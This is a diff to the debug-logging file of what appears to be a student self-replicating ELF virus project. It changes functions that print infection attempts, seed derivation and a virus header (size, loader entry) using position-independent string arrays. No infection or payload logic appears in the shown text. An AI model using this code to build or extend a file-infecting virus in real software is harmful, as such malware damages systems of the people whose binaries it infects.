@@ -1,19 +1,8 @@
-/* ************************************************************************** */
-/*                                                                            */
-/*                                                        :::      ::::::::   */
-/*   log.c                                              :+:      :+:    :+:   */
-/*                                                    +:+ +:+         +:+     */
-/*   By: anselme <anselme@student.42.fr>            +#+  +:+       +#+        */
-/*                                                +#+#+#+#+#+   +#+           */
-/*   Created: 2019/12/20 23:16:08 by anselme           #+#    #+#             */
-/*   Updated: 2019/12/20 23:26:08 by anselme          ###   ########.fr       */
-/*                                                                            */
-/* ************************************************************************** */
+#ifdef LOGS
 
-#ifdef DEBUG
-
-#include "utils.h"
-#include "position_independent.h"
+# include "virus_header.h"
+# include "utils.h"
+# include "position_independent.h"
 
 void	log_try_infecting(const char *file)
 {
@@ -31,46 +20,44 @@ void	log_success(void)
 	putstr(success);
 }
 
-void	log_old_father_seeds(const uint64_t father_seed[2])
+void	log_all_seeds(const uint64_t father_seed, const uint64_t hdr_hash, const uint64_t son_seed)
 {
-	PD_ARRAY(char, original,'[','L','O','G',']',' ','o','r','i','g','i','n','a','l',':',' ',' ',' ',' ',0);
-	PD_ARRAY(char, semicolon, ';',0);
-
-	putstr(original);
-	putu64(father_seed[0]);
-	putstr(semicolon);
-	putu64(father_seed[1]);
-}
-
-void	log_all_seeds(const uint64_t father_seed[2], const uint64_t son_seed[2], uint64_t client_id, uint64_t unique_seed)
-{
-	PD_ARRAY(char, semicolon, ';',0);
 	PD_ARRAY(char, newline, '\n',0);
 	PD_ARRAY(char, father,'[','L','O','G',']',' ','f','a','t','h','e','r','_','s','e','e','d',':',' ',0);
 	PD_ARRAY(char, son,'[','L','O','G',']',' ','s','o','n','_','s','e','e','d',':',' ',' ',' ',' ',0);
-	PD_ARRAY(char, uniquemethod,'[','L','O','G',']',' ','u','n','i','q','u','e',' ','s','e','e','d',' ','=',' ','f','i','r','s','t',' ','s','o','n',' ','s','e','e','d',' ','^',' ','c','l','i','e','n','t',' ','I','D','\n','[','L','O','G',']',' ','\033','[','3','5','m',0);
+	PD_ARRAY(char, uniquemethod,'[','L','O','G',']',' ','s','o','n','_','s','e','e','d',' ','=',' ','h','a','s','h','(','f','a','t','h','e','r','_','s','e','e','d',' ','^',' ','c','l','i','e','n','t','_','I','D',')','\n','[','L','O','G',']',' ','\033','[','3','5','m',0);
 	PD_ARRAY(char, equal,'\033','[','0','m',' ','=',' ',0);
 	PD_ARRAY(char, opxor,' ','^',' ',0);
+	PD_ARRAY(char, rpar,')',0);
+	PD_ARRAY(char, hashlpar,'h','a','s','h','(',0);
 
-
-	putstr(newline);
 	putstr(father);
-	putu64(father_seed[0]);
-	putstr(semicolon);
-	putu64(father_seed[1]);
+	putu64(father_seed);
 	putstr(newline);
 	putstr(son);
-	putu64(son_seed[0]);
-	putstr(semicolon);
-	putu64(son_seed[1]);
+	putu64(son_seed);
 	putstr(newline);
 	putstr(uniquemethod);
-	putu64(unique_seed);
+	putu64(son_seed);
 	putstr(equal);
-	putu64(son_seed[0]);
+	putstr(hashlpar);
+	putu64(father_seed);
 	putstr(opxor);
-	putu64(client_id);
+	putu64(hdr_hash);
+	putstr(rpar);
 	putstr(newline);
+}
+
+void	log_virus_header(const struct virus_header *vhdr)
+{
+	PD_ARRAY(char, newline, '\n',0);
+	PD_ARRAY(char, seed, '[','L','O','G',']',' ','s','e','e','d',':',' ',0);
+	PD_ARRAY(char, virus_size, '[','L','O','G',']',' ','v','i','r','u','s','_','s','i','z','e',':',' ',0);
+	PD_ARRAY(char, loader_entry, '[','L','O','G',']',' ','l','o','a','d','e','r','_','e','n','t','r','y',':',' ',0);
+
+	putstr(seed); putu64(vhdr->seed); putstr(newline);
+	putstr(virus_size); dput32(vhdr->full_virus_size); putstr(newline);
+	putstr(loader_entry); putu64((size_t)vhdr->loader_entry); putstr(newline);
 }
 
 #endif
